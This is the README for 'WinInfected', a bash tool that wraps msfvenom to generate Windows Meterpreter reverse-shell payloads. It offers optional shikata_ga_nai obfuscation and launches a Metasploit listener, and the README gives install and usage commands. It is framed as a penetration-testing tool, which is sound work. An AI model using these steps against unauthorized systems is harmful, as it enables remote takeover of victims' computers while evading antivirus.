# WinInfected v1.2

WinInfected is a bash script that automates the generation of a Windows Meterpreter payload using `msfvenom` from the Metasploit Framework. The script supports payload obfuscation via the `x86/shikata_ga_nai` encoder (with 5 iterations) when the `--obfuscate` option is specified. It also offers convenient options for checking and installing dependencies, updating the required packages, and launching `msfconsole` with a pre-configured multi/handler.

## Features

- **Payload Generation:** Create a Windows Meterpreter payload using `msfvenom`.
- **Optional Obfuscation:** Use the `x86/shikata_ga_nai` encoder with 5 iterations for payload obfuscation.
- **Dependency Management:** Check for and install missing dependencies (Metasploit Framework).
- **Script Update:** Update dependencies with a single command.
- **Automated Listener:** Optionally launch `msfconsole` with a configured multi/handler to listen for incoming connections.
- **Current Directory Output:** The generated payload is saved in the current working directory with a timestamped filename.

## Usage

## Script Options

```bash
WinInfected v1.2
Usage: sudo wininfected [LHOST] [LPORT] [--obfuscate]
Options:
  --dependencies   Check and install missing dependencies.
  --update         Update script and dependencies.
  --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder.
  -h, --help       Display this help message.
  More information: https://github.com/byfranke/wininfected
```

## Steps to Run:

```bash
git clone https://github.com/byfranke/wininfected
```

```bash
cd wininfected
```
```bash
chmod +x setup.sh
```

```bash
sudo ./setup.sh
```

Install Dependencies (if needed):
```bash
sudo wininfected --dependencies
```

Generate a Payload:

Without Obfuscation:
```bash
sudo wininfected <LHOST> <LPORT>
```

With Obfuscation:
```bash
sudo wininfected <LHOST> <LPORT> --obfuscate
```

Replace `<LHOST>` with your local host IP and `<LPORT>` with your desired port number.

Launch Listener (Optional): After the payload is generated, the script will prompt:

Do you want to start msfconsole to listen for connections? (y/n):
Enter `y` to launch `msfconsole` with a pre-configured multi/handler, or `n` to exit.

## Dependencies

- Metasploit Framework: Provides both `msfvenom` and `msfconsole`.

Installation (on Debian-based systems):

```bash
sudo apt update && sudo apt install metasploit-framework -y
```
If this package is unavailable, the script will download the Rapid7 installer automatically when you run:
```bash
sudo wininfected --dependencies
```

Installation (on Arch-based systems):

```bash
sudo sudo pacman -Syu && sudo sudo pacman -S metasploit
```


**Notes**
- The generated payload is stored in the current working directory with a filename based on the current timestamp.
- Ensure you run the script with the appropriate permissions to install packages and execute commands.
- This tool is designed for educational purposes and authorized penetration testing only.

## Tests

Execute the shell-based tests with:

```bash
bash tests/test_help.sh
```

The test passes if the help output contains the expected usage string.

## Disclaimer
- **WARNING:** This script is intended for legal, ethical, and authorized penetration testing only. The author is not responsible for any misuse or damage caused by this tool.
